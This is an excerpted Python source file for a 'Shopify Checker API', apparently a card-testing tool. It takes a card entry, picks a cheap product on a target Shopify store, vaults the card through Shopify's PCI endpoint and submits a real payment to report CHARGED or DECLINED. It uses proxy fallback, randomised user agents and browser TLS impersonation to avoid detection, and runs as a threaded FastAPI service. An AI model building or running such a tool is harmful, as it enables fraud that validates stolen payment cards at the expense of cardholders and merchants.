"""
Shopify Checker API — All-in-One (v3.2.2)
==========================================
FULLY WORKING VERSION — all known bugs fixed.

v3.2.2:
  - TLS auto-disables impersonation when a proxy is set (free/shared proxies
    reject curl_cffi's HTTP/2 impersonation upgrade; HTTP/1.1 CONNECT works).
  - _is_proxy_407 recognises the real curl_cffi / aiohttp proxy exception
    classes (ClientConnectorDNSError, ClientProxyConnectionError, etc.), so
    the automatic fallback actually fires.
  - Step 0 (find_product) retries once without impersonation when the
    impersonated proxy request fails, before tagging the site as broken.

v3.2.1:
  - Non-impersonated fallback when proxy returns HTTP 407 (curl CONNECT tunnel failed)
  - Step 0 proxy errors now tagged PROXY_INVALID (was silently reported as generic ERROR)
  - PCI vault call retries without proxy on failure (matches VXO fallback behaviour)
  - Strict 5-point charge verification preserved — no fake CHARGED

v3.2.0:
  - REAL signedHandles sent in SubmitForCompletion (fixes delivery-change gate)
  - Delivery-change auto-retry (up to 2 attempts)
  - Missing "id" field added to Proposal + SubmitForCompletion
  - queueToken null vs empty-string fixed
  - cartMetafields removed (rejected by some Shopify stores)
  - Actions regex uses capturing group

CHARGED only when Shopify confirms a real order with proof.
"""
...
_R = {
    ...
    "typename":     re.compile(r'"__typename"\s*:\s*"([^"]+)"'),
}
...
class TLS:
    """
    v3.2.2 — TLS client with automatic non-impersonated fallback on proxy 407.

    curl_cffi + impersonate works with most paid proxies but can be rejected
    by free / shared proxies with HTTP 407 (CONNECT tunnel failed). On that
    specific error we transparently rebuild the session without impersonation
    so the same proxy still works.

    v3.2.2 also defaults to impersonate=False when a proxy is supplied, because
    most free / shared / VPN endpoints (pointtoserver, purevpn, etc.) only
    speak HTTP/1.1 CONNECT and reject curl_cffi's HTTP/2 impersonation upgrade.
    """
    def __init__(self, proxy: str = "", timeout: int = 20, impersonate: bool | None = None):
        self.profile = random.choice(BROWSER_PROFILES)
        self.ua = random.choice(USER_AGENTS)
        self.proxy = proxy
        self.timeout = timeout
        if impersonate is None:
            # Auto-pick: no proxy → impersonate; proxy present → plain HTTP/1.1
            impersonate = not bool(proxy)
        self._impersonating = impersonate
        self._build_session(impersonate)

    def _build_session(self, impersonate: bool):
        base_headers = {
            "User-Agent": self.ua,
    ...
    def _is_proxy_407(self, e: Exception) -> bool:
        m   = str(e).lower()
        cls = type(e).__name__.lower()
        return (
            "407" in m
            or "connect tunnel failed" in m
            or "proxy authentication" in m
            or "curl: (7)" in m
            # curl_cffi / aiohttp proxy exception class names
            or "clientproxyconnectionerror" in cls
            or "clientconnectordnserror"    in cls
            or "clientconnectorerror"       in cls
            or "clienthttpproxyerror"       in cls
            or "connectiontimeout"          in cls
            # generic connection errors that occur behind dead proxies
            or "could not resolve"          in m
            or "name or service not known"  in m
            or "connect call failed"        in m
        )

    def _request(self, method: str, u, **k):
        k.setdefault("timeout", 20)
        try:
            return getattr(self.s, method)(u, **k)
        except Exception as e:
            if self._impersonating and self.proxy and self._is_proxy_407(e):
                log.warning("407 with impersonate → retrying without impersonate (%s)", self.profile)
                try:
                    self.s.close()
                except Exception:
                    pass
                self._build_session(impersonate=False)
                return getattr(self.s, method)(u, **k)
            raise

    def get(self, u, **k):
        return self._request("get", u, **k)

    def post(self, u, **k):
        return self._request("post", u, **k)
...
def fetch_ids(client: TLS, shop: str, checkout_html: str) -> Tuple[str, str, str]:
    ...
    try:
        ...
        raise Exception(f"fetch actions JS failed: {e}")
...
def _proposal_body(ses: str, stable: str, variant: str, queue: Optional[str],
                   ...
                   currency: str, country: str, prop_id: str) -> str:
    """v3.2.0: prop_id required for Shopify persisted queries."""
    if addr:
        partial = {
            "address1": addr.a1 or "", "address2": addr.a2 or "", "city": addr.city or "",
            "countryCode": addr.country, "postalCode": addr.postal or "",
            "firstName": addr.first, "lastName": addr.last,
            "zoneCode": addr.zone or "", "phone": addr.phone or "", "oneTimeUse": False,
        }
        billing = {
            "address1": addr.a1 or "", "address2": addr.a2 or "", "city": addr.city or "",
            "countryCode": addr.country, "postalCode": addr.postal or "",
            "firstName": addr.first, "lastName": addr.last,
            "zoneCode": addr.zone or "", "phone": addr.phone or "",
        }
    else:
...
def vault_card(ident_sig: str, card_num: str, card_name: str, mes: int, ano: int,
    ...
    """
    v3.2.1 — retries without proxy if the first attempt fails.

    The PCI vault (checkout.pci.shopifyinc.com / shopifycs.com) is a different
    host than the shop. Many proxies that 407 on the shop also 407 here, so we
    fall back to a direct request. This matches VXO's behaviour and prevents
    "no pci id" errors on otherwise working proxies.
    """
    ...
    # Attempt 1 — with proxy (or direct if none)
    ...
    try:
        ...
        log.warning("vault attempt1 (proxy) failed: %s", e)

    # Attempt 2 — without proxy
    if proxy:
        try:
            with Session(impersonate=profile) as s:
                r = s.post(endpoint, data=payload, headers=headers, timeout=20)
            m = _R["pci_id"].search(r.text)
            if m:
                log.warning("vault succeeded without proxy (fallback)")
                return m.group(1)
        except Exception as e:
            log.warning("vault attempt2 (no proxy) failed: %s", e)
...
def submit_payment(client: TLS, shop: str, ref: str, ck_tok: str, ses_tok: str,
    ...
    """v3.2.0: passes REAL signedHandles to satisfy delivery gate."""
    delivery_lines = [{
    ...
    de_lines = [{"signedHandle": h} for h in (signed_handles or [])]
...
def run_checkout(shop: str, card_entry: str, proxy: str = "", low: bool = True) -> CheckResult:
    ...
    try:
        # Step 0 — v3.2.2: retry once without impersonation on proxy failure
        max_p = 5.0 if low else float("inf")
        try:
            variant, price, _ = find_product(client, shop, max_price=max_p)
        except Exception as e:
            # If we were impersonating through a proxy, rebuild the session
            # without impersonation and retry Step 0 once.
            if getattr(client, "_impersonating", False) and client.proxy:
                log.warning("Step0 failed with impersonation — retrying without: %s", str(e)[:120])
                try:
                    client.s.close()
                except Exception:
                    pass
                client._build_session(impersonate=False)
                try:
                    variant, price, _ = find_product(client, shop, max_price=max_p)
                except Exception as e2:
                    err   = str(e2)
                    low_e = err.lower()
                    if ("407" in low_e or "connect tunnel" in low_e
                            or "proxy authentication" in low_e or "curl: (7)" in low_e
                            or "could not resolve proxy" in low_e
                            or "name or service not known" in low_e
                            or "connect call failed" in low_e):
                        result.status_code = "PROXY_INVALID"
                        result.error = f"Step0 proxy failed: {err[:150]}"
                    else:
                        result.error = f"Step0: {err[:150]}"
        ...
        # Step 4
        try:
            body = _proposal_body(ses_tok, stable, variant, None, None, None, cur, ctry, prop_id)
            ...
            qt = _g("queue", resp)
            if not qt:
                typename = _g("typename", resp)
                snippet = resp[:200].replace("\n", " ").replace('"', "'")
                raise Exception(f"no queue | typename={typename} | resp={snippet}")
        except Exception as e:
            result.retryable = True
        ...
        # Step 5
        try:
            body = _proposal_body(ses_tok, stable, variant, qt, email, None, cur, ctry, prop_id)
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            qt2 = _g("queue", resp)
            if not qt2:
        ...
        for attempt in range(1 + len(fallbacks)):
            body = _proposal_body(ses_tok, stable, variant, qt2, email, addr, cur, ctry, prop_id)
            resp = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, body)
            _qt = _g("queue", resp)
            if not _qt:
                raise Exception("no queue")
        ...
        # Step 7
        try:
            body = _proposal_body(ses_tok, stable, variant, qt3, email, addr, cur, ctry, prop_id)
        ...
        # Step 8
        try:
            body = _proposal_body(ses_tok, stable, variant, qt4, email, addr, cur, ctry, prop_id)
        ...
        # Step 9 — PCI (v3.2.1 has internal no-proxy fallback)
        try:
        ...
        # Step 11 — STRICT with delivery-change retry
        delivery_change_retries = 0
        ...
        for poll_num in range(1, 21):
            try:
                ...
                if rtype == "FailedReceipt":
                    ...
                    if ("SOME_DELIVERY_DETAILS_MAY_HAVE_CHANGED" in code
                        or "DELIVERY_DETAILS" in code):
                        if delivery_change_retries >= MAX_DELIVERY_RETRIES:
                            result.status = CheckStatus.DECLINED
                            result.status_code = "DELIVERY_DETAILS_CHANGED"
                            result.error = "delivery details changed (retry exhausted)"
                            return result
                        delivery_change_retries += 1
                        try:
                            b6 = _proposal_body(ses_tok, stable, variant, qt4, email, addr, cur, ctry, prop_id)
                            r6 = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, b6)
                            q6 = _g("queue", r6)
                            if not q6:
                                result.retryable = True
                                result.error = "delivery-refresh: no queue (step6)"
                                return result
                            b7 = _proposal_body(ses_tok, stable, variant, q6, email, addr, cur, ctry, prop_id)
                            r7 = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, b7)
                            q7 = _g("queue", r7)
                            if not q7:
                                result.retryable = True
                                result.error = "delivery-refresh: no queue (step7)"
                                return result
                            b8 = _proposal_body(ses_tok, stable, variant, q7, email, addr, cur, ctry, prop_id)
                            r8 = send_proposal(client, shop, ck_url, ck_tok, ses_tok, build, src, prop_id, b8)
                            q8 = _g("queue", r8)

                            new_handle = extract_delivery_handle_json(r8)
                            new_signed = extract_signed_handles(r8)
                            new_shipping = extract_shipping(r8)
                            new_total = extract_total(r8) or total
                            new_tax = extract_tax(r8)
                            total = new_total

                            new_attempt = f"{ck_tok}-{''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(10))}"
                            new_submit = submit_payment(
                                client, shop, ck_url, ck_tok, ses_tok, build, src, submit_id,
                                stable, variant, q8 or "", email, addr, cur, ctry,
                                pci_id, total, new_shipping, new_handle,
                                new_signed, new_tax, new_attempt,
                            )
                            new_rid = _g("receipt_id", new_submit)
                            new_rses = _g("receipt_ses", new_submit)
                            if new_rid and new_rses:
                                receipt_id = new_rid
                                receipt_ses = new_rses
                                time.sleep(1)
                                continue
                            else:
                                err = any_error(new_submit) or "RESUBMIT_FAILED"
                                result.status = CheckStatus.DECLINED
                                result.status_code = err
                                result.error = err
                                return result
                            ...
                            result.retryable = True
                            result.error = f"delivery-refresh failed: {e}"
                            return result

                    # ── Normal FailedReceipt handling ──
                    ...
                    low_r = (code + " " + pr).lower()
                    if any(s in low_r for s in site_signals):
...
app = FastAPI(title="Shopify Checker API", version="3.2.2", docs_url=None, redoc_url=None)
...
<h1>Shopify Checker API v3.2.2</h1>
...
async def health():
    with _lock:
        a = _active
    return {"ok": True, "threads": THREADS, "retries": RETRIES, "active": a, "version": "3.2.2"}
